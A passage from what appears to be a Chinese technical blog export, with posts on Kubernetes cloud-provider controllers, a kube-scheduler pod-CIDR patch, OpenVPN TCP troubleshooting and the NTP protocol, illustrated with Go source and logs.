// Update condition only if it doesn&#x27;t reflect the current state. _, condition := v1node.GetNodeCondition(&amp;node.Status, v1.NodeNetworkUnavailable) if condition == nil || condition.Status != v1.ConditionFalse &#123; rc.updateNetworkingCondition(types.NodeName(node.Name), true) &#125; &#125; nodeCIDRs[nodeName] = node.Spec.PodCIDR &#125;... wg.Wait() return nil&#125; ​\t目前腾讯云 TKE的 global router 网络模式就是符合上述描述，在 global router 模式下 route controller 会在节点启动的时候去云上注册路由，下图中节点 172.0.0.1 上 kubelet 上报 ready 时候 route controller 会去 vpc 中注册 10.0.0.0&#x2F;24 的路由，并且 172.0.0.1 上的 pod 都是从 10.0.0.0&#x2F;24 的 cidr 分配 IP 的，这样就实现了和 vpc 的互通。 image-20190423113516302","tags":["k8s"]},{"title":"cloud provider Service Controller","path":"/2019/04/01/cloud-provider-svc-controller/","content":"​\tservice controller 负责观察 k8s 中 service 资源的创建，更新和删除事件。并基于当前 k8s 中的 service 状态去云上配置负载均衡，保证云上的负载均与 serivce 资源描述相一致。 ​\tservice controller 在 cloud contorller 中的一个模块随 cloud controller 启动，可以通过启动 new service controller 参数可以观测到，service controller 是通过观察 service 和 node 资源来工作的。 1234567891011121314// Start the service controllerserviceController, err := servicecontroller.New( cloud, client(&quot;service-controller&quot;), c.SharedInformers.Core().V1().Services(), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName,)if err != nil &#123; glog.Errorf(&quot;Failed to start service controller: %v&quot;, err)&#125; else &#123; go serviceController.Run(stop, int(c.ComponentConfig.ServiceController.ConcurrentServiceSyncs)) time.Sleep(wait.Jitter(c.ComponentConfig.Generic.ControllerStartInterval.Duration, ControllerStartJitter))&#125; ​\tnew 函数的实现如下，核心是流程是通过 list&#x2F;watch 机制来观测 service 的 event，然后触发 enqueue 的函数，再通过 sync woker 从 wrok queue 中取出 item 处理云上 lb 的绑定逻辑。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// New returns a new service controller to keep cloud provider service resources// (like load balancers) in sync with the registry.func New( cloud cloudprovider.Interface, kubeClient clientset.Interface, serviceInformer coreinformers.ServiceInformer, nodeInformer coreinformers.NodeInformer, clusterName string,) (*ServiceController, error) &#123; broadcaster := record.NewBroadcaster() broadcaster.StartLogging(glog.Infof) broadcaster.StartRecordingToSink(&amp;v1core.EventSinkImpl&#123;Interface: kubeClient.CoreV1().Events(&quot;&quot;)&#125;) recorder := broadcaster.NewRecorder(scheme.Scheme, v1.EventSource&#123;Component: &quot;service-controller&quot;&#125;) if kubeClient != nil &amp;&amp; kubeClient.CoreV1().RESTClient().GetRateLimiter() != nil &#123; if err := metrics.RegisterMetricAndTrackRateLimiterUsage(&quot;service_controller&quot;, kubeClient.CoreV1().RESTClient().GetRateLimiter()); err != nil &#123; return nil, err &#125; &#125; s := &amp;ServiceController&#123; cloud: cloud, knownHosts: []*v1.Node&#123;&#125;, kubeClient: kubeClient, clusterName: clusterName, cache: &amp;serviceCache&#123;serviceMap: make(map[string]*cachedService)&#125;, eventBroadcaster: broadcaster, eventRecorder: recorder, nodeLister: nodeInformer.Lister(), nodeListerSynced: nodeInformer.Informer().HasSynced, queue: workqueue.NewNamedRateLimitingQueue(workqueue.NewItemExponentialFailureRateLimiter(minRetryDelay, maxRetryDelay), &quot;service&quot;), &#125; serviceInformer.Informer().AddEventHandlerWithResyncPeriod( cache.ResourceEventHandlerFuncs&#123; AddFunc: s.enqueueService, UpdateFunc: func(old, cur interface&#123;&#125;) &#123; oldSvc, ok1 := old.(*v1.Service) curSvc, ok2 := cur.(*v1.Service) if ok1 &amp;&amp; ok2 &amp;&amp; s.needsUpdate(oldSvc, curSvc) &#123; s.enqueueService(cur) &#125; &#125;, DeleteFunc: s.enqueueService, &#125;, serviceSyncPeriod, ) s.serviceLister = serviceInformer.Lister() s.serviceListerSynced = serviceInformer.Informer().HasSynced if err := s.init(); err != nil &#123; return nil, err &#125; return s, nil&#125; ​\tservice 通过形如 namespace+serivce 名字的 key 放入 work queue，而 syncService 函数根据 key 取出 service 进行实际的处理操作，如果操作完成过后从 work queue 中调用 queue.done(key) 移除掉。 1234567891011121314151617func (s *ServiceController) processNextWorkItem() bool &#123; key, quit := s.queue.Get() if quit &#123; return false &#125; defer s.queue.Done(key) err := s.syncService(key.(string)) if err == nil &#123; s.queue.Forget(key) return true &#125; runtime.HandleError(fmt.Errorf(&quot;error processing service %v (will retry): %v&quot;, key, err)) s.queue.AddRateLimited(key) return true&#125; ​\t之所以 service 要一个额外的 work queue 有原因的，其一是因为云上 lb 的实际绑定解绑操作相对于单纯的 serivce 声明要慢很多，其二是当 service 从 k8s 中删除的时候就真的被从 etcd 中移除了，这个时候从缓存里面找个删除对应公网 lb 的关键参数。 ​\t这个才是 service controller 的核心逻辑，这里会确认 service 是删除还是更新。 12345678910111213141516171819202122232425262728293031// syncService will sync the Service with the given key if it has had its expectations fulfilled,// meaning it did not expect to see any more of its pods created or deleted. This function is not meant to be// invoked concurrently with the same key.func (s *ServiceController) syncService(key string) error &#123; startTime := time.Now() var cachedService *cachedService defer func() &#123; glog.V(4).Infof(&quot;Finished syncing service %q (%v)&quot;, key, time.Since(startTime)) &#125;() namespace, name, err := cache.SplitMetaNamespaceKey(key) if err != nil &#123; return err &#125; // service holds the latest service info from apiserver service, err := s.serviceLister.Services(namespace).Get(name) switch &#123; case errors.IsNotFound(err): // service absence in store means watcher caught the deletion, ensure LB info is cleaned glog.Infof(&quot;Service has been deleted %v. Attempting to cleanup load balancer resources&quot;, key) err = s.processServiceDeletion(key) case err != nil: glog.Infof(&quot;Unable to retrieve service %v from store: %v&quot;, key, err) default: cachedService = s.cache.getOrCreate(key) err = s.processServiceUpdate(cachedService, service, key) &#125; return err&#125; ​\t看一下处理 service update 的核心逻辑， 1234567891011121314151617181920212223242526272829303132333435// processServiceUpdate operates loadbalancers for the incoming service accordingly.// Returns an error if processing the service update failed.func (s *ServiceController) processServiceUpdate(cachedService *cachedService, service *v1.Service, key string) error &#123; if cachedService.state != nil &#123; // 如果是同名字但是 UID 不一样 // 会被确认是不同的 serivice 则这个 lb 会被删除。 if cachedService.state.UID != service.UID &#123; err := s.processLoadBalancerDelete(cachedService, key) if err != nil &#123; return err &#125; &#125; &#125; // cache the service, we need the info for service deletion cachedService.state = service err := s.createLoadBalancerIfNeeded(key, service) if err != nil &#123; eventType := &quot;CreatingLoadBalancerFailed&quot; message := &quot;Error creating load balancer (will retry): &quot; if !wantsLoadBalancer(service) &#123; eventType = &quot;CleanupLoadBalancerFailed&quot; message = &quot;Error cleaning up load balancer (will retry): &quot; &#125; message += err.Error() s.eventRecorder.Event(service, v1.EventTypeWarning, eventType, message) return err &#125; // Always update the cache upon success. // NOTE: Since we update the cached service if and only if we successfully // processed it, a cached service being nil implies that it hasn&#x27;t yet // been successfully processed. s.cache.set(key, cachedService) return nil&#125; ​\t根据实际情况判断是更新，还是创建云上 lb 资源。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// createLoadBalancerIfNeeded ensures that service&#x27;s status is synced up with loadbalancer// i.e. creates loadbalancer for service if requested and deletes loadbalancer if the service// doesn&#x27;t want a loadbalancer no more. Returns whatever error occurred.func (s *ServiceController) createLoadBalancerIfNeeded(key string, service *v1.Service) error &#123; // Note: It is safe to just call EnsureLoadBalancer. But, on some clouds that requires a delete &amp; create, // which may involve service interruption. Also, we would like user-friendly events. // Save the state so we can avoid a write if it doesn&#x27;t change previousState := v1helper.LoadBalancerStatusDeepCopy(&amp;service.Status.LoadBalancer) var newState *v1.LoadBalancerStatus var err error\t// 针对 Type 变更，要做云的 lb 清理 if !wantsLoadBalancer(service) &#123; _, exists, err := s.balancer.GetLoadBalancer(context.TODO(), s.clusterName, service) if err != nil &#123; return fmt.Errorf(&quot;error getting LB for service %s: %v&quot;, key, err) &#125; if exists &#123; glog.Infof(&quot;Deleting existing load balancer for service %s that no longer needs a load balancer.&quot;, key) s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;DeletingLoadBalancer&quot;, &quot;Deleting load balancer&quot;) if err := s.balancer.EnsureLoadBalancerDeleted(context.TODO(), s.clusterName, service); err != nil &#123; return err &#125; s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;DeletedLoadBalancer&quot;, &quot;Deleted load balancer&quot;) &#125; newState = &amp;v1.LoadBalancerStatus&#123;&#125; &#125; else &#123; glog.V(2).Infof(&quot;Ensuring LB for service %s&quot;, key) // TODO: We could do a dry-run here if wanted to avoid the spurious cloud-calls &amp; events when we restart s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;EnsuringLoadBalancer&quot;, &quot;Ensuring load balancer&quot;)\t// 这个地方是 service 更新更新的核心逻辑 newState, err = s.ensureLoadBalancer(service) if err != nil &#123; return fmt.Errorf(&quot;failed to ensure load balancer for service %s: %v&quot;, key, err) &#125; s.eventRecorder.Event(service, v1.EventTypeNormal, &quot;EnsuredLoadBalancer&quot;, &quot;Ensured load balancer&quot;) &#125; // Write the state if changed // TODO: Be careful here ... what if there were other changes to the service? if !v1helper.LoadBalancerStatusEqual(previousState, newState) &#123; // Make a copy so we don&#x27;t mutate the shared informer cache service = service.DeepCopy() // Update the status on the copy service.Status.LoadBalancer = *newState if err := s.persistUpdate(service); err != nil &#123; // TODO: This logic needs to be revisited. We might want to retry on all the errors, not just conflicts. if errors.IsConflict(err) &#123; return fmt.Errorf(&quot;not persisting update to service &#x27;%s/%s&#x27; that has been changed since we received it: %v&quot;, service.Namespace, service.Name, err) &#125; runtime.HandleError(fmt.Errorf(&quot;failed to persist service %q updated status to apiserver, even after retries. Giving up: %v&quot;, key, err)) return nil &#125; &#125; else &#123; glog.V(2).Infof(&quot;Not persisting unchanged LoadBalancerStatus for service %s to registry.&quot;, key) &#125; return nil&#125; 12345func (s *ServiceController) ensureLoadBalancer(service *v1.Service) (*v1.LoadBalancerStatus, error) &#123;... // 基本就是调用这个函数 return s.balancer.EnsureLoadBalancer(context.TODO(), s.clusterName, service, nodes)&#125; ​\t下面是抽象给 cloud provider 实现的接口，由 serivce controller 来统一调用，EnsureLoadBalancer 是最核心的函数，一般云厂商的实现方式就是将他们的公网 LB 产品和 k8s 的 LoadBalancer type 的 service 结合起来。 12345678910111213141516171819202122232425262728293031// LoadBalancer is an abstract, pluggable interface for load balancers.type LoadBalancer interface &#123; // TODO: Break this up into different interfaces (LB, etc) when we have more than one type of service // GetLoadBalancer returns whether the specified load balancer exists, and // if so, what its status is. // Implementations must treat the *v1.Service parameter as read-only and not modify it. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager GetLoadBalancer(ctx context.Context, clusterName string, service *v1.Service) (status *v1.LoadBalancerStatus, exists bool, err error) // GetLoadBalancerName returns the name of the load balancer. Implementations must treat the // *v1.Service parameter as read-only and not modify it. GetLoadBalancerName(ctx context.Context, clusterName string, service *v1.Service) string // EnsureLoadBalancer creates a new load balancer &#x27;name&#x27;, or updates the existing one. Returns the status of the balancer // Implementations must treat the *v1.Service and *v1.Node // parameters as read-only and not modify them. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager EnsureLoadBalancer(ctx context.Context, clusterName string, service *v1.Service, nodes []*v1.Node) (*v1.LoadBalancerStatus, error) // UpdateLoadBalancer updates hosts under the specified load balancer. // Implementations must treat the *v1.Service and *v1.Node // parameters as read-only and not modify them. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager UpdateLoadBalancer(ctx context.Context, clusterName string, service *v1.Service, nodes []*v1.Node) error // EnsureLoadBalancerDeleted deletes the specified load balancer if it // exists, returning nil if the load balancer specified either didn&#x27;t exist or // was successfully deleted. // This construction is useful because many cloud providers&#x27; load balancers // have multiple underlying components, meaning a Get could say that the LB // doesn&#x27;t exist even if some part of it is still laying around. // Implementations must treat the *v1.Service parameter as read-only and not modify it. // Parameter &#x27;clusterName&#x27; is the name of the cluster as presented to kube-controller-manager EnsureLoadBalancerDeleted(ctx context.Context, clusterName string, service *v1.Service) error&#125; ​\t如果客户在 k8s 中创建 LoadBalancer type 的 service，cloud proivder 的 EnsureLoadBalancer 常见实现方式是，调用云上 LB 相关接口将 LB 及其必要的依赖资源创建出来，其 LB 对应的后端是 serivce 所属的集群内的 k8s node全部节点，部分节点也可以的原因是因为收到流量的部分节点会通过 kube-proxy 的规则将流量二次转发具体细节。​\t当 lb 创建完成，后端绑定成功后，客户就可以通过访问公网类型的 LB 的 VIP 来访问 Pod 中的业务了。这个时候流量是先到云厂商的公网网关，然后流量通过 LB 到云厂商提供给 k8s 的 node 上，最后再由 kube-proxy 通过 watch endpoint 产生的转发规则讲流量运到 pod 中。","tags":["k8s"]},{"title":"cloud provider summary","path":"/2019/03/29/cloud-provider/","content":"​\tcloud controller manager 是可插拔的，它运行新的 cloud provider 简单方便的与 Kubernetes 集成。 ​\tcloud provider 启动从 new 一个 cloud manager command 开始 12345func main() &#123;... command := app.NewCloudControllerManagerCommand()...&#125; ​\tRun 函数是 k8s contrller manager 定义的关键入口，在 NewCloudControllerManagerCommand 中被调用，参数是一个 CompletedConfig，第二个参数是 stopCh。 12345678// NewCloudControllerManagerCommand creates a *cobra.Command object with default parametersfunc NewCloudControllerManagerCommand() *cobra.Command &#123; s, err := options.NewCloudControllerManagerOptions()... if err := Run(c.Complete(), wait.NeverStop); err != nil &#123;... return cmd&#125; ​\tRun 函数的实现，主要是做些 controller 启动前的准备工作，比如锁的获取，实际做 controller 启动的是调用 startControllers。 123456789101112131415161718192021222324// Run runs the ExternalCMServer. This should never exit.func Run(c *cloudcontrollerconfig.CompletedConfig, stopCh &lt;-chan struct&#123;&#125;) error &#123;...\trun := func(ctx context.Context) &#123; if err := startControllers(c, ctx.Done(), cloud); err != nil &#123; glog.Fatalf(&quot;error running controllers: %v&quot;, err) &#125;\t&#125;...\t// Lock required for leader election\trl, err := resourcelock.New(c.ComponentConfig.Generic.LeaderElection.ResourceLock, &quot;kube-system&quot;, &quot;cloud-controller-manager&quot;, c.LeaderElectionClient.CoreV1(), resourcelock.ResourceLockConfig&#123; Identity: id, EventRecorder: c.EventRecorder, &#125;)\tif err != nil &#123; glog.Fatalf(&quot;error creating lock: %v&quot;, err)\t&#125;....&#125; 在 startcontroller 中实际启动的 controller 如下：CloudNodeController，PersistentVolumeLabelController，RouteController，serviceController。 CloudNodeController 负责初始化 k8s 中 node 与云上的信息。 PersistentVolumeLabelController 负责给 PV 打 Label，保证存储不会被跨区挂载。 RouteController 用来创建路由解决不通 node 上 pod 的互通问题。 serviceController 用来创建云厂商的负载均衡。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// startControllers starts the cloud specific controller loops.func startControllers(c *cloudcontrollerconfig.CompletedConfig, stop &lt;-chan struct&#123;&#125;, cloud cloudprovider.Interface) error &#123;...\tif cloud != nil &#123; // Initialize the cloud provider with a reference to the clientBuilder cloud.Initialize(c.ClientBuilder)\t&#125;\t// Start the CloudNodeController\tnodeController := cloudcontrollers.NewCloudNodeController( c.SharedInformers.Core().V1().Nodes(), client(&quot;cloud-node-controller&quot;), cloud, c.ComponentConfig.KubeCloudShared.NodeMonitorPeriod.Duration, c.ComponentConfig.NodeStatusUpdateFrequency.Duration)\tnodeController.Run(stop)...\t// Start the PersistentVolumeLabelController\tpvlController := cloudcontrollers.NewPersistentVolumeLabelController(client(&quot;pvl-controller&quot;), cloud)\tgo pvlController.Run(5, stop)...\t// Start the service controller\tserviceController, err := servicecontroller.New( cloud, client(&quot;service-controller&quot;), c.SharedInformers.Core().V1().Services(), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName,\t)\tif err != nil &#123; glog.Errorf(&quot;Failed to start service controller: %v&quot;, err)\t&#125; else &#123; go serviceController.Run(stop, int(c.ComponentConfig.ServiceController.ConcurrentServiceSyncs))...\t// If CIDRs should be allocated for pods and set on the CloudProvider, then start the route controller\tif c.ComponentConfig.KubeCloudShared.AllocateNodeCIDRs &amp;&amp; c.ComponentConfig.KubeCloudShared.ConfigureCloudRoutes &#123; if routes, ok := cloud.Routes(); !ok &#123; glog.Warning(&quot;configure-cloud-routes is set, but cloud provider does not support routes. Will not configure cloud provider routes.&quot;) &#125; else &#123; var clusterCIDR *net.IPNet if len(strings.TrimSpace(c.ComponentConfig.KubeCloudShared.ClusterCIDR)) != 0 &#123; _, clusterCIDR, err = net.ParseCIDR(c.ComponentConfig.KubeCloudShared.ClusterCIDR) if err != nil &#123; glog.Warningf(&quot;Unsuccessful parsing of cluster CIDR %v: %v&quot;, c.ComponentConfig.KubeCloudShared.ClusterCIDR, err) &#125; &#125; routeController := routecontroller.New(routes, client(&quot;route-controller&quot;), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName, clusterCIDR) go routeController.Run(stop, c.ComponentConfig.KubeCloudShared.RouteReconciliationPeriod.Duration)...&#125;","tags":["k8s"]},{"title":"openvpn 链接问题分析","path":"/2019/03/15/segment-not-captured/","content":"​\t到新环境熟悉内部接口，postman 去调试内部服务接口发现接口没有返回，换个电脑调用正常。初步怀疑是自己电脑问题，遂打开 wireshark 根据目标主机 ip 结合路由信息判断的走的utun1接口出流量。 tcp-follow-all ​\t上图通过 wireshark 看到我获取 cube 接口GET请求发出去，多次尝试依然都是http的 response 的没有被用户进程收到，wireshark 报错tcp previos sgement not captured 。单独点开tcp segment可以在 wireshark 中看到 response 是回来了但是没有成功的被应用层接收到 (如下图)。 cube-request-response-loss ​\t换个更直观的 tcp flow 的图（忽略里面的 ECN 协商的）：在 tcp 握手过完成过后，客户端发送请求，服务端返回数据，在17:48:34.242222时间片之前丢了一个 wireshark 说没有抓到（可能是丢了），也就是说在服务端响应过后可能丢了一个包，然后看到三次握手时候的 ack 重复出现。 image-20190321190517191 ​\t之后是一堆的 keeplive ack 的报文，keeplive 超时时间到了过后服务端 reset 了 tcp connection。 image-20190321190825868 ​\t通过 Google 发现网络上的文章都是说存在网络链路质量问题导致丢包。但是我的环境是使用的openvpn链接到开发环境，也就是说openvpn提供的链路可能有问题，遂尝试点开 vpn 客户端探索一下可配置项，发现openvpn版本是使用 v2.3.17 版本。 openvpn-conf-info 无脑尝试换到 2.4.3。 openvpn-2.4.3-libressl 居然发现一切正常了。非常可能和openvpn的版本有关系。 normal-http-req-rsp 猜想验证 1​\t搜索发现一个 wireshark 的issue,猜想会不会和 mac 的enc实现有关系？ ​\t尝试在 mac 通过sudo sysctl -w net.inet.tcp.ecn_initiate_out=0和sudo sysctl -w net.inet.tcp.ecn_negotiate_in=0关闭ecn，发现 wireshakre 显示的 tcp 的握手时符合预期，但是网络时依然不通的，初步排除了 mac os tcp ecn 的可能。(rst 是我 C-c 了 curl 发出的 image-20190317141133151 猜想尝试 2​\t打开客户端的配置文件发现openvpn的配置模式是tun+udp,看上去是构建一个overlay的网络，猜测可能是服务端和客户端的ssl版本不兼容，在 overlay 网络数据解密的时候出现异常。如果是这样那么应该是所有走tun设备的 tcp 流量都有问题（和之前错误的 tcp 行为一致），结合之前同事让我ssh登录服务器也没有正常登录。 ​\t因为没有搜索到openvpn相关的兼容性的changelog，短时间无法验证暂时搁置。 TCP Previous Segment is no captured 大咖讲网络 Wireshark 的提示 tcp reset 的若干原因相对全面","tags":["network"]},{"title":"NTP","path":"/2018/09/16/ntp/","content":"​\t之前和同事聊天，同事问我服务器有网络延迟存在是如何同步时间的？鉴于之前知识背景我只能说参考一下 NTP（Synchronization Approaches for Packet-Based Networks [^Clock_Synchronization]）服务。认真想一想就该发现时间服务作为现代社会的基础设施应该有相当一段历史了。 ​\t还是先关注计算机，在计算机中时钟是振荡器 + 计数器 。计数器是正数，振荡器是记录时间流失，振荡器的质量（准确度和稳定性）决定着时钟的质量。目前常见的振荡器是晶体振荡器简称晶振。 ​\t在实际的 Linux time subsystem 中 2.6.16 前后差别较大，在 2.6.16 通过时钟中断配合一个修正来实现的，这就有几个问题：时钟的分辨率不够高；时间有可能倒退。不过在 2.6.16 后 Linux 中使用高分辨率时钟计时器[^linux_ppt],Linux 时间子系统中可以时钟来源，一般选其中一个使用。目前 Linux 常用的时间来源是 cpu 内部的 TSC，精度能到 cpu 主频分之 1，不过因为时间相关的系统调用原因(clock_gettime)，目前 Linux 能提供的时间精度是1ns。 ​\t前面描述了 Linux 系统中时间，但是现实中很多业务需要时间保持同步，也就是说需要时间同步相关的服务。最早的时间同步协议是Daytime Protocol(rfc 867)和Time Protocol(rfc 868),都是基于 tcp 的，前者是 4 字节描述时间，后者是字符串描述时间，有个共同的缺点是只能精确到秒；而且还有网络延迟导致的误差。 ​\t后来David L. Mills提出了 NTP 协议，最早的是ntp (rfc 958)，但是目前市面上主要用的是ntp v3 (rfc 1305)和ntp v4 (rfc 5905),ntp 协议解决了之前时间的协议的精度问题，理论精度到 233 皮秒；也解决因为网络网络延迟问题。不同于之前时间协议基于 tcp，ntp 协议是基于 udp 的。 img ​\t典型的 NTP 客户端将定期轮询不同网络上的三个或更多服务器。为同步其时钟，客户端必须计算其时间偏移量和来回通信延迟。时间偏移“θ”定义为：$$\\theta &#x3D; {(t_1 - t_0) + (t_2 - t_3 ) \\over 2}$$往返延迟“δ”为：$$\\delta &#x3D; {(t_3 - t_0 ) - ( t_2- t_1 )}$$ 其中：: t0 是请求数据包传输的客户端时间戳，: t1 是请求数据包回复的服务器时间戳，: t2 是响应数据包传输的服务器时间戳t3 是响应数据包回复的客户端时间戳。​\t“θ”和“δ”的值通过过滤器并进行统计分析，异常值被剔除，并从最好的三个剩余候选中导出估算的时间偏移。然后调整时钟频率以逐渐减小偏移，创建一个反馈回路。 ​\t其实有了“θ”和“δ”就可以修正系统时间了，但是这并不太够，首先如果客户端的时钟频率快于服务端，那么下一次的测试发现时间又不对的了，所以 ntp 还需要修改了时钟的频率；其次是在真实环境下 ntp 部署模式是层级化的，还需要同步 ntp 上层 ntp，所以还需要同步与上层 ntp server 的关系，不过这个情况不是我这次关注的点。 ​\t根据之前描述，知道了 ntp 同步会修改时间差，会修改 client 服务区的时钟频率。修改时间差时如果发现客户端发现服务区和客户端的时间差小于 128ms，ntp 会平滑的的将 128ms 误差调整到几个毫秒级，换句话说 ntp 同步时间永远有误差，之所以这么做时因为 ntp 的反馈控制系统需要一个输入θr+。后修改频率，因为不仅要考虑到要避免时间跳变，还要避免频率跳变，所以频率的变化也要是连续的。 ​\tntp 服务在实现上一般是多线程，每个服务有 2 个线程，一个接受信息 (the peer process) 另一个发送请求 (the poll process)。\t这里 copy 一下 mills 老先生的 ppt^NTP_Precision_Time_Synchronization。 image-20180917002754971 Selection 算法主要是做拜占庭容错，丢弃不正确的服务器 Cluster 算法主要是从统计学角度来区分 Selection 算法选出来可用的服务器，区分出哪个时间更加准确。 Combine 算法是用来统计被选择的正确服务的平均数，生成最终的 offset。 image-20180917004640362 ​\tphase detector 是用来测试本机时间和标准时间相差有多大，得出一个差值 Vc，将这个差值给一个 clock filter。clock filter 的作用是减少network jitter,它通过算法[^Clock_Filter_Algorithm]选择较合适样本，并拒绝因为网络拥塞和包冲突导致的采样噪点，然后讲数据传给内核。然后到 kernel 里面一个锁相回路[^Phase_locked_loop]，最后生成一个控制信号，来调整频率。这样修改时间的差值修正了（网络延迟的问题），频率的不同步的问题也通过 loop filter 解决了。 ​\t其实还有个点，就是 os 收到数据包和应用层的数据包时间不一致，而且发送时间和 os 实际发送时间不一致。mills 老先生把之前 ntp 协议中的时间其实还做了更细颗粒的的划分 image-20180917003851007老先生在 2008 年发现 T3b在 freebsd 最小大约是 16μs，言外之意就是建议在 bsd 上跑 ntp server。这个时间的度量基本没有高精度解（在我看来。 [^linux_ppt]: Transforming the Linux time subsystems 2006 [^Clock_Filter_Algorithm]:Clock Filter Algorithm [^Phase_locked_loop]: Phase-locked loop [^Clock_Synchronization]: Clock Synchronization in Distributed Systems Using NTP and PTP","tags":["inf"]},{"title":"kube-scheduler pod cidr bugfix","path":"/2018/08/07/kube-scheduler-bugfix/","content":"​\t之前写一个需求需要做容器网络的规划，发现kuberntes在调度的时候不会把 ip 地址作为一个调度的参考项。也就是手当node上规划出来的子网中的 ip 用光且 cpu 和 mem 以及其他调度参考项都满足的时候 pod 还是会被分配到这个节点上，并且kubelet会伴随着如下报错： 1NetworkPlugin kubenet failed to set up pod &quot;frontend-jh0kf_default&quot; network: Error adding container to network: no IP addresses available in network: kubenet ​\t修复方案有很多种，核心思路是围绕着调度器参考的对象。比较优雅的方式是在kube-scheduler中将 ip 地址也作为一个调度资源，但是这个实现起来工作量相对其他方法大了一点；有个折中取巧的方式是利用kube-scheduler中的一个Allocated Pod来实现，工作量小，实现简单。 1234567891011121314151617181920212223242526272829diff --git a/pkg/scheduler/cache/node_info.go b/pkg/scheduler/cache/node_info.goindex 31be774578e..6c9f5713e94 100644--- a/pkg/scheduler/cache/node_info.go+++ b/pkg/scheduler/cache/node_info.go@@ -29,6 +29,8 @@ import ( v1helper &quot;k8s.io/kubernetes/pkg/apis/core/v1/helper&quot; priorityutil &quot;k8s.io/kubernetes/pkg/scheduler/algorithm/priorities/util&quot; &quot;k8s.io/kubernetes/pkg/scheduler/util&quot;+ &quot;net&quot;+ &quot;math&quot; ) var (@@ -315,7 +317,16 @@ func (n *NodeInfo) AllowedPodNumber() int &#123; if n == nil || n.allocatableResource == nil &#123; return 0 &#125;- return n.allocatableResource.AllowedPodNumber+ ip, cidr, err := net.ParseCIDR(n.node.Spec.PodCIDR)+ if err != nil || ip.To4() == nil &#123;+ return n.allocatableResource.AllowedPodNumber+ &#125;+ size, _ := cidr.Mask.Size()+ if size &gt;= 31 &#123;+ return 0+ &#125;+ // -3 (network address, broadcaster address, gateway address)+ return int(math.Min(math.Pow(2, float64(32-size)) - 3, float64(n.allocatableResource.AllowedPodNumber))) &#125; 不过还有需要考虑的是当 pod 使用的是 hostNetwork: true ，上面 patch 工作是不符合预期的。 测试case –node-cidr-mask-size&#x3D;30期望只有一个 pod 分配到 ip 地址并运行，可以查看到 cm 的信息如下： 1234567[root@VM_128_11_centos ~]# systemctl status kube-controller-manager.service -l● kube-controller-manager.service - kube-controller-manager Loaded: loaded (/usr/lib/systemd/system/kube-controller-manager.service; enabled; vendor preset: disabled) Active: active (running) since Tue 2018-08-07 13:37:56 CST; 2min 23s ago Main PID: 20759 (kube-controller) CGroup: /system.slice/kube-controller-manager.service └─20759 /usr/bin/kube-controller-manager --node-cidr-mask-size=30 --cluster-cidr=10.255.0.0/19 --allocate-node-cidrs=true --master=http://127.0.0.1:60001 --cloud-config=/etc/kubernetes/qcloud.conf --service-account-private-key-file=/etc/kubernetes/server.key --service-cluster-ip-range=10.255.31.0/24 --allow-untagged-cloud=true --cloud-provider=qcloud --cluster-name=cls-n1jte9ty --root-ca-file=/etc/kubernetes/cluster-ca.crt --use-service-account-credentials=true --horizontal-pod-autoscaler-use-rest-clients=true kubelet 信息如下，看见cni插件的参数： 12345678910111213141516171819Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: I0807 13:38:24.454373 23809 kubenet_linux.go:308] CNI network config set to &#123;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;cniVersion&quot;: &quot;0.1.0&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;name&quot;: &quot;kubenet&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;type&quot;: &quot;bridge&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;bridge&quot;: &quot;cbr0&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;mtu&quot;: 1500,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;addIf&quot;: &quot;eth0&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;isGateway&quot;: true,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;ipMasq&quot;: false,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;hairpinMode&quot;: false,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;ipam&quot;: &#123;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;type&quot;: &quot;host-local&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;subnet&quot;: &quot;10.255.0.0/30&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;gateway&quot;: &quot;10.255.0.1&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;routes&quot;: [Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &#123; &quot;dst&quot;: &quot;0.0.0.0/0&quot; &#125;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: ]Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &#125;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &#125; 确认一下运行中的 pod 数量和 pod 所在节点的信息： 12[root@VM_128_11_centos ~]# kubectl get pod --all-namespaces | grep Running | wc -l1 1234567[root@VM_128_11_centos ~]# kubectl describe node 172.30.0.43...Non-terminated Pods: (1 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default guohao-555fb5456d-kdx8n 0 (0%) 0 (0%) 0 (0%) 0 (0%)Allocated resources: case –node-cidr-mask-size&#x3D;29期望运行 2^(32-29) - 3 &#x3D; 5 个 pod 分配到 ip 并运行，可以查看到下面 kubelet 的 cni 信息： 1234567891011121314151617181920Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: I0807 13:44:48.669847 25163 docker_service.go:307] docker cri received 